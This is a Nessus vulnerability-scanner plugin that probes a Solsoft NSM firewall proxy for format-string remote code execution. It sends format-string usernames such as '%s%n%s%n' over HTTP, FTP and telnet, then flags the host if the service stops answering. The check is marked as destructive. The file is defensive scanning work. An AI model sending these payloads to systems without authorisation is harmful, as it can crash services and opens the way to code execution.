#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(10540);
  script_version("$Revision: 1.31 $");
  script_cvs_date("$Date: 2017/05/05 17:46:22 $");

  script_osvdb_id(439);

  script_name(english:"Solsoft NSM Format Strings RCE");
  script_summary(english:"Determines if NSM is vulnerable to format strings attacks.");

  script_set_attribute(attribute:"synopsis", value:
"A firewall proxy application running on the remote host is affected
by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Solsoft NSM application running on the remote host is affected by
multiple flaws in ulm logging related to format string processing. An
unauthenticated, remote attacker can exploit these to execute
arbitrary code.");
  # http://web.archive.org/web/20010627055309/http://www.solsoft.org/nsm/news/972559672/index_html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7f17d802");
  script_set_attribute(attribute:"solution", value:
"If you are using NSM, please contact your vendor for a patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/01/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2000/10/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2000-2017 Tenable Network Security, Inc.");

  script_dependencie("smtp_settings.nasl", "http_version.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports(21,23,80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("ftp_func.inc");
include("telnet_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

#
# This script attempts to reproduce the described problem via
# telnet, ftp and http. I did not write three scripts because all these
# flaws are the same in the end.
#

#
# No service detection is performed here, because nsm respects
# the ports (21,23 and 80).
#

#
#
# First, try HTTP
#


port = 80;
if(get_port_state(port) && ! get_kb_item("Services/www/" + port + "/broken") )
{
  #
  # We first log in as 'nessus:nessus'
  #
  domain = get_kb_item("Settings/third_party_domain");
  if(!domain) domain = "nessus.org";

  rq = http_mk_proxy_request(method:"GET", item: "/", version: 10, scheme: "http", host: domain, username: "nessus", password: "nessus");
  w = http_send_recv_req(port: port, req: rq);
  if (! isnull(w))
  {
   #
   # Then we log in as 'nessus%s%s%s%s%s%s:pass'
   #
    rq = http_mk_proxy_request(method:"GET", item: "/", version: 10, scheme: "http", host: domain, username: "nessus%s%s%s%s%s%s", password: "pass");
    w = NULL;
    for (i = 0; i < 3 && isnull(w); i ++)
      w = http_send_recv_req(port: port, req: rq);
    if (isnull(w)) security_hole(port);
  }
}


#
# Then, try FTP
#
port = 21;
if(get_port_state(port))
{
soc = open_sock_tcp(port);
if(soc)
{
  b = recv_line(socket:soc, length:4096);
  if("proxy" >< b)
   {
   req = string("USER nessus\r\n");
   send(socket:soc, data:req);
   r = recv_line(socket:soc, length:1024);
   close(soc);
   if(r)
    {
     soc = open_sock_tcp(port);
     if ( soc )
     {
     r = recv_line(socket:soc, length:4096);
     req = string("USER %s%n%s%n%s%n\r\n");
     send(socket:soc, data:req);
     r = ftp_recv_line(socket:soc, retry: 3);
     close(soc);
     if(!r){
     	security_hole(port);
	exit(0);
     }
    }
   }
  }
 }
}

#
# Then try telnet
#
port = 23;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 b = telnet_negotiate(socket:soc);
 b = string(b,recv(socket:soc, length:2048, timeout:2));
 if("proxy" >< b)
 {
   req = string("nessus\r\n");
   send(socket:soc, data:req);
   r = recv_line(socket:soc, length:1024);
   close(soc);
   if(r)
   {
     soc = open_sock_tcp(port);
     if ( soc )
     {
     req = string("nessus%s%n%s%n%s%n\r\n");
     send(socket:soc, data:req);
     r ='';
     for (i = 0; i < 3 && ! r; i ++)
        r = recv_line(socket:soc, length:1024);
     close(soc);
     if(!r)security_hole(port);
     }
   }
  }
 }
}
